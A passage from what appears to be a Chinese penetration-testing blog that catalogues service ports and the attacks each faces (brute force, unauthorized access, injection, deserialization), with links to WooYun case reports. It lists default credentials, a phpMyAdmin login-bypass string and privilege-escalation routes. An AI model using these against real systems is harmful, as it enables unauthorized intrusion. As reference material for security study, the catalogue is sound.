title="LDAP"></a>LDAP</h5><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p><p>默认端口：389</p><p>攻击方式：</p><p>注入攻击：盲注</p><p>未授权访问：</p><p>爆破：弱口令</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/967" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-051234" target="_blank" rel="noopener">欧朋LDAP服务匿名访问</a></p><p><a href="http://drops.wooyun.org/pentesting/2125" target="_blank" rel="noopener">使用LDAP查询快速提升域权限</a></p><h4 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h4><h5 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h5><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p><p>默认端口：22</p><p>攻击方式</p><p>爆破：弱口令、</p><p>漏洞：28退格漏洞、OpenSSL漏洞</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0135530" target="_blank" rel="noopener">安宇创新科技ssh弱口令</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0154829" target="_blank" rel="noopener">宜信贷某站存在OpenSSL漏洞</a></p><h5 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h5><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p><p>默认端口：23</p><p>攻击方式</p><p>爆破：弱口令</p><p>嗅探：此种情况一般发生在局域网；</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0162704" target="_blank" rel="noopener">大量惠普打印机远程telnet可被查看和操作</a></p><h5 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h5><p>​    远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p><p>默认端口：3389</p><p>攻击方式：</p><p>爆破：3389端口爆破工具就有点多了</p><p>Shift粘滞键后门：5次shift后门</p><p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；</p><h5 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h5><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p><p>默认端口：5900+桌面ID（5901；5902）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>认证口令绕过：</p><p>拒绝服务攻击：（<a href="http://drops.wooyun.org/papers/9014" target="_blank" rel="noopener">CVE-2015-5239</a>）</p><p>权限提升：（CVE-2013-6886）</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0143044" target="_blank" rel="noopener">广西电信客服服务器使用VNC存在弱口令可直接控制</a></p><h5 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h5><p>​        PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p><p>默认端口：5632</p><p>攻击方式：</p><p>提权控制服务：</p><p>拒绝服务攻击：</p><p>代码执行：<a href="https://www.seebug.org/vuldb/ssvid-30050" target="_blank" rel="noopener">请参考</a></p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-034519/" target="_blank" rel="noopener">黑龙江物价局多处安全漏洞可能导致服务器沦陷(pcAnywhere提权+密码突破)</a></p><h3 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h3><p>​    HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p><p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p><h5 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h5><p>默认端口：80/81/443</p><p>攻击方式：</p><p>IIS<br>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p><p>短文件名泄漏：这种一般没啥影响</p><p>解析漏洞：详细见apache服务</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-047134" target="_blank" rel="noopener">徐州市教育系统大量IIS PUT漏洞</a></p><p><a href="http://www.wooyun.org/bug.php?action=view&id=27365" target="_blank" rel="noopener">用友软件IIS写权限(PUT)导致可获取webshell控制服务器</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-093865" target="_blank" rel="noopener">国家电网某分站存在iis短文件名漏洞</a></p><h5 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h5><p>默认端口：80/8080</p><p>攻击方式：</p><p>爆破：弱口令（爆破manager后台）</p><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p><p>解析漏洞：<a href="http://drops.wooyun.org/papers/539" target="_blank" rel="noopener">请参考</a></p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-018433" target="_blank" rel="noopener">安卓开发平台存在上传漏洞和Apache解析漏洞,成功获取webshell</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-06947" target="_blank" rel="noopener">腾讯分站 Apache 漏洞</a></p><h5 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h5><p>默认端口：7001</p><p>攻击方式：</p><p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p><p>Congsole后台部署webshell：</p><p>Java反序列化：</p><p>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</p><p>SSRF窥探内网：<a href="http://www.wooyun.org/bugs/wooyun-2015-0136698" target="_blank" rel="noopener">央视网SSRF可窥探内网</a></p><p>案列分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-038214" target="_blank" rel="noopener">福建省人力资源和社会保障厅下属某WEBLOGIC弱口令</a></p><p><a href="http://drops.wooyun.org/tips/8321" target="_blank" rel="noopener">利用Weblogic进行入侵的一些总结</a></p><h5 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h5><p>默认端口8080；其他端口1098/1099/4444/4445/8080/8009/8083/8093</p><p>攻击方式：</p><p>爆破：弱口令（爆破jboss系统后台）</p><p>远程代码执行：<a href="http://www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html" target="_blank" rel="noopener">由于配置不当造成</a></p><p>Java反序列化：</p><p>案例分享</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-07409" target="_blank" rel="noopener">中华人民共和国民政部JBoss配置不当</a></p><p><a href="http://drops.wooyun.org/papers/178" target="_blank" rel="noopener">JBOSS安全问题总结</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0110279" target="_blank" rel="noopener">中国科学院某处jboss应用漏洞</a></p><h5 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h5><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p><p>攻击方式：</p><p>爆破：弱口令（控制台）</p><p>任意文件泄漏：（CVE-2014-0823）</p><p>Java反序列化</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-036803" target="_blank" rel="noopener">中国电信某通用型业务系统(Websphere)GetShell漏洞</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0167244" target="_blank" rel="noopener">大汉网络有限公司远程命令执行漏洞(WebSphere案例)</a></p><h5 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h5><p>默认端口：http 8080；IIOP 3700；控制台4848</p><p>攻击方式：</p><p>爆破：弱口令（对于控制台）</p><p>任意文件读取：</p><p>认证绕过：</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595/" target="_blank" rel="noopener">应用服务器glassfish存在通用任意文件读取漏洞</a></p><p><a href="http://www.tuicool.com/articles/ZRJriy" target="_blank" rel="noopener">Oracle GlassFish Server认证绕过</a></p><h5 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h5><p>默认端口：8080、8089</p><p>攻击方式：</p><p>爆破：弱口令（默认管理员）</p><p>未授权访问：</p><p>反序列化：</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2014-062541" target="_blank" rel="noopener">酷6Jenkins系统未授权访问可执行系统命令</a></p><h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><p>默认端口：8080</p><p>攻击方式：</p><p>目录遍历</p><p>远程文件读取</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-017200" target="_blank" rel="noopener">爱奇艺Resin配置漏洞</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0126353" target="_blank" rel="noopener">Resin漏洞利用案例之目录遍历/以金蝶某系统为例</a></p><h5 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h5><p> 默认端口：8080</p><p> 攻击方式：</p><p>远程共享缓冲区溢出</p><h5 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h5><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p><p>默认端口：1352</p><p>攻击方式：</p><p>爆破：弱口令（admin password）控制台</p><p>信息泄露</p><p>跨站脚本攻击</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-053881" target="_blank" rel="noopener">Lotus Domino WebMail一处越权访问</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134024" target="_blank" rel="noopener">中电投集团某系统弱口令直达内网涉及/OA系统/内部邮箱/财务系统/人力资源系统</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0109008" target="_blank" rel="noopener">中国某大型金融机构地方业务弱口令导致数万商户信息泄露&amp;访问Lotus Domino后台</a></p><h4 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h4><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p><h5 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h5><p>默认端口：3306</p><p>攻击方式：</p><p>爆破：弱口令</p><p>身份认证漏洞：<a href="http://www.freebuf.com/vuls/3815.html" target="_blank" rel="noopener">CVE-2012-2122</a></p><p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p><p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</p><p>案例分享：</p><p><a href="https://www.seebug.org/appdir/MySQL" target="_blank" rel="noopener">漏洞分享</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0115534/" target="_blank" rel="noopener">和讯网某站点存在mysql注入漏洞</a></p><p><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390" target="_blank" rel="noopener">MySQL提权总结</a></p><h5 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h5><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p><p>攻击方式：</p><p>爆破：弱口令/使用系统用户</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/1620" target="_blank" rel="noopener">MSSQL注射总结</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102404" target="_blank" rel="noopener">上海安脉综合管理系统mssql注射漏洞</a></p><p><a href="http://drops.wooyun.org/tips/1067" target="_blank" rel="noopener">解密MSSQL连接数据库密码</a></p><p><a href="http://www.freebuf.com/articles/database/22997.html" target="_blank" rel="noopener">从攻击MSSQL到提权</a>: 使用msf针对mssql的一次完整渗透</p><h5 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h5><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>注入攻击；</p><p>漏洞攻击；</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/papers/6035" target="_blank" rel="noopener">Oracle盲注结合XXE漏洞远程获取数据</a></p><h5 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h5><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；<a href="http://lcx.cc/?i=1275" target="_blank" rel="noopener">浅谈postgresql数据库攻击技术</a> 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p><p>默认端口：5432</p><p>攻击方式：</p><p>爆破：弱口令：postgres postgres</p><p>缓冲区溢出：CVE-2014-2669</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/6449" target="_blank" rel="noopener">Hacking postgresql</a></p><p><a href="http://zone.wooyun.org/content/4971" target="_blank" rel="noopener">关于postgresql的那些事</a></p><h5 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h5><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：<a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">请参考</a></p><p>默认端口：27017</p><p>攻击方式：</p><p>爆破：弱口令</p><p>未授权访问；github有攻击代码；<a href="https://github.com/yangbh/Hammer/blob/master/plugins/System/mongodb_unauth_access.py" target="_blank" rel="noopener">请点击</a></p><p>案例分享：</p><p><a href="http://bobao.360.cn/learning/detail/274.html" target="_blank" rel="noopener">MongoDB phpMoAdmin远程代码执行</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-047153" target="_blank" rel="noopener">搜狐MongoDB未授权访问</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2014-066883" target="_blank" rel="noopener">新浪微米未授权访问</a></p><p><a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">解决MongoDB各种隐患问题</a></p><h5 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h5><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a> 访问密码 e547</p><p>默认端口：6379</p><p>攻击方式：</p><p>爆破：弱口令</p><p>未授权访问+配合ssh key提权；</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0152710/" target="_blank" rel="noopener">中国铁建网redis+ssh-keygen免认证登录</a></p><h5 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h5><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p><p>攻击方式：</p><p>爆破：弱口令</p><p>命令注入：</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-083132" target="_blank" rel="noopener">广西自考信息系统Sybase数据库注入</a></p><p><a href="http://www.venustech.com.cn/NewsInfo/124/22061.Html" target="_blank" rel="noopener">Sybase EAServer命令注入漏洞</a></p><h5 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h5><p>默认端口：5000</p><p>攻击方式：</p><p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0113071" target="_blank" rel="noopener">哈尔滨银行主站DB2注入</a></p><p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p><p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p><h3 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h3><h5 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h5><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p><p>默认端口：25（smtp）、465（smtps）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>未授权访问</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-025810" target="_blank" rel="noopener">腾讯邮箱smtp注册时间限制绕过漏洞</a></p><p><a href="http://drops.wooyun.org/papers/534" target="_blank" rel="noopener">邮件伪造详解</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2011-03388" target="_blank" rel="noopener">qq邮箱伪造发件地址，容易被钓鱼利用</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-098813" target="_blank" rel="noopener">众多厂商邮件系统配置不当可伪造邮件人</a></p><h5 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h5><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p><p>攻击方式：</p><p>爆破；弱口令</p><p>未授权访问；</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bug.php?action=view&id=147087" target="_blank" rel="noopener">中国联通沃邮箱等部分Android客户端免密码登陆（可获取任意联通用户pop3密码）</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2011-094877" target="_blank" rel="noopener">中航信邮箱密码泄漏及VPN账号和大量邮箱弱口令导致可内网漫游拿到域控</a></p><h5 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h5><p>默认端口：143（imap）、993（imaps）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>配置不当</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-022037" target="_blank" rel="noopener">163邮箱二次验证饶过缺陷</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-045426" target="_blank" rel="noopener">南方周末邮件服务器任意文件读取漏洞</a></p><h4 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h4><h5 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h5><p>默认端口：53</p><p>攻击方式：</p><p>区域传输漏洞</p><p>见2中的总结</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2014-061403" target="_blank" rel="noopener">全球Top1000Websites中存在DNS区域传送漏洞的网站列表</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0132048" target="_blank" rel="noopener">团购王某站DNS域传送漏洞</a></p><p><a href="http://drops.wooyun.org/tips/1354" target="_blank" rel="noopener">DNS泛解析与内容投毒</a></p><h5 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h5><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p><p>攻击方式：</p><p>DHCP劫持；</p><p>见2中总结</p><p>案例分享：</p><p><a href="http://www.freebuf.com/articles/network/74995.html" target="_blank" rel="noopener">流氓DHCP服务器内网攻击测试</a></p><h5 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h5><p>默认端口：161</p><p>攻击方式:</p><p>爆破：弱口令</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/409" target="_blank" rel="noopener">snmp弱口令引起的信息泄漏</a></p><p><a href="http://drops.wooyun.org/tips/2106" target="_blank" rel="noopener">基于snmp的反射攻击的理论及其实现</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-081037" target="_blank" rel="noopener">华为某服务器SNMP弱口令</a></p><h4 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h4><h5 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h5><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="noopener">请参考</a></p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-020282" target="_blank" rel="noopener">Apache Hadoop远程命令执行</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-022434" target="_blank" rel="noopener">新浪漏洞系列第六弹–大量hadoop应用对外访问</a></p><h5 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h5><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p><p>默认端口：2181</p><p>攻击方式：</p><p>未授权访问；</p><p>案例分享：</p><p><a href="http://tangscan.com/plugin/17261" target="_blank" rel="noopener">zookeeper未授权访问漏洞</a></p><p>网上关于这方面的案例暂时不多，但是对于大数据逐渐泛滥的今天，这些漏洞未来会在乌云上出现一大波！</p><h5 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h5><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p><p>默认端口：8069</p><p>攻击方式：</p><p>远程命令执行：</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/68" target="_blank" rel="noopener">当渗透遇到zabbix–小谈zabbix安全</a></p><p><a href="http://www.secpulse.com/archives/2089.html" target="_blank" rel="noopener">Zabbix的前台SQL注射漏洞利用</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-025219" target="_blank" rel="noopener">网易zabbix运维不当，导致任意命令执行。(可提权、可内网渗透)</a></p><h5 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h5><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p><p>默认端口：9200（）、9300（）</p><p>攻击方式：</p><p>未授权访问；</p><p>远程命令执行；</p><p>文件遍历；</p><p>低版本webshell植入；</p><p>案例分享：</p><p><a href="http://www.secpulse.com/archives/5401.html" target="_blank" rel="noopener">ElasticSearch 远程代码执行漏洞</a></p><p><a href="http://www.freebuf.com/tools/38025.html" target="_blank" rel="noopener">elasticsearch 漏洞利用工具</a></p><h5 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h5><p>默认端口：11211</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/papers/865" target="_blank" rel="noopener">Memcache安全配置</a></p><p><a href="https://help.aliyun.com/knowledge_detail/6936805.html" target="_blank" rel="noopener">memcache 未授权访问漏洞</a></p><h5 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h5><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击技巧</strong></th></tr></thead><tbody><tr><td><strong>21/22/69</strong></td><td><strong>ftp/tftp</strong> <strong>：文件传输协议</strong></td><td><strong>爆破</strong> <strong>嗅探</strong> <strong>溢出；后门</strong></td></tr><tr><td><strong>22</strong></td><td><strong>ssh</strong> <strong>：远程连接</strong></td><td><strong>爆破</strong> <strong>OpenSSH</strong> <strong>；28个退格</strong></td></tr><tr><td><strong>23</strong></td><td><strong>telnet</strong>  <strong>：远程连接</strong></td><td><strong>爆破</strong> <strong>嗅探</strong></td></tr><tr><td><strong>25</strong></td><td><strong>smtp</strong> <strong>：邮件服务</strong></td><td><strong>邮件伪造</strong></td></tr><tr><td><strong>53</strong></td><td><strong>DNS</strong> <strong>：域名系统</strong></td><td><strong>DNS区域传输</strong> <strong>0.00DNS劫持DNS缓存投毒DNS欺骗深度利用：利用DNS隧道技术刺透防火墙</strong></td></tr><tr><td><strong>67/68</strong></td><td><strong>dhcp</strong></td><td><strong>劫持</strong> <strong>欺骗</strong></td></tr><tr><td><strong>110</strong></td><td><strong>pop3</strong></td><td><strong>爆破</strong></td></tr><tr><td><strong>139</strong></td><td><strong>samba</strong></td><td><strong>爆破</strong>     <strong>未授权访问  远程代码执行</strong></td></tr><tr><td><strong>143</strong></td><td><strong>imap</strong></td><td><strong>爆破</strong></td></tr><tr><td><strong>161</strong></td><td><strong>snmp</strong></td><td><strong>爆破</strong></td></tr><tr><td><strong>389</strong></td><td><strong>ldap</strong></td><td><strong>注入攻击</strong> <strong>未授权访问</strong></td></tr><tr><td><strong>512/513/514</strong></td><td><strong>linux r</strong></td><td><strong>直接使用</strong> <strong>rlogin</strong></td></tr><tr><td><strong>873</strong></td><td><strong>rsync</strong></td><td><strong>未授权访问</strong></td></tr><tr><td><strong>1080</strong></td><td><strong>socket</strong></td><td><strong>爆破：进行内网渗透</strong></td></tr><tr><td><strong>1352</strong></td><td><strong>lotus</strong></td><td><strong>爆破：弱口令</strong> <strong>信息泄漏：源代码</strong></td></tr><tr><td><strong>1433</strong></td><td><strong>mssql</strong></td><td><strong>爆破：使用系统用户登录</strong> <strong>注入攻击</strong></td></tr><tr><td><strong>1521</strong></td><td><strong>oracle</strong></td><td><strong>爆破：</strong> <strong>TNS</strong>  <strong>注入攻击</strong></td></tr><tr><td><strong>2049</strong></td><td><strong>nfs</strong></td><td><strong>配置不当</strong></td></tr><tr><td><strong>2181</strong></td><td><strong>zookeeper</strong></td><td><strong>未授权访问</strong></td></tr><tr><td><strong>3306</strong></td><td><strong>mysql</strong></td><td><strong>爆破</strong> <strong>拒绝服务</strong> <strong>注入</strong></td></tr><tr><td><strong>3389</strong></td><td><strong>rdp</strong></td><td><strong>爆破</strong> <strong>Shift</strong> <strong>后门</strong></td></tr><tr><td><strong>4848</strong></td><td><strong>glassfish</strong></td><td><strong>爆破：控制台弱口令</strong> <strong>认证绕过</strong></td></tr><tr><td><strong>5000</strong></td><td><strong>sybase/DB2</strong></td><td><strong>爆破</strong> <strong>注入</strong></td></tr><tr><td><strong>5432</strong></td><td><strong>postgresql</strong></td><td><strong>缓冲区溢出</strong> <strong>注入攻击</strong> <strong>爆破：弱口令</strong></td></tr><tr><td><strong>5632</strong></td><td><strong>pcanywhere</strong></td><td><strong>拒绝服务</strong> <strong>代码执行</strong></td></tr><tr><td><strong>5900</strong></td><td><strong>vnc</strong></td><td><strong>爆破：弱口令</strong> <strong>认证绕过</strong></td></tr><tr><td><strong>6379</strong></td><td><strong>redis</strong></td><td><strong>未授权访问</strong> <strong>爆破：弱口令</strong></td></tr><tr><td><strong>7001</strong></td><td><strong>weblogic</strong></td><td><strong>Java</strong> <strong>反序列化</strong> <strong>控制台弱口令</strong> <strong>控制台部署</strong> <strong>webshell</strong></td></tr><tr><td><strong>80/443/8080</strong></td><td><strong>web</strong></td><td><strong>常见</strong> <strong>web</strong> <strong>攻击</strong> <strong>控制台爆破</strong> <strong>对应服务器版本漏洞</strong></td></tr><tr><td><strong>8069</strong></td><td><strong>zabbix</strong></td><td><strong>远程命令执行</strong></td></tr><tr><td><strong>9090</strong></td><td><strong>websphere</strong> <strong>控制台</strong></td><td><strong>爆破：控制台弱口令</strong> <strong>Java</strong> <strong>反序列</strong></td></tr><tr><td><strong>9200/9300</strong></td><td><strong>elasticsearch</strong></td><td><strong>远程代码执行</strong></td></tr><tr><td><strong>11211</strong></td><td><strong>memcacache</strong></td><td><strong>未授权访问</strong></td></tr><tr><td><strong>27017</strong></td><td><strong>mongodb</strong></td><td><strong>爆破</strong> <strong>未授权访问</strong></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——被动信息收集</title>
      <link href="/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/"/>
      <url>/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——基本工具</title>
      <link href="/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/"/>
      <url>/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/</url>
      
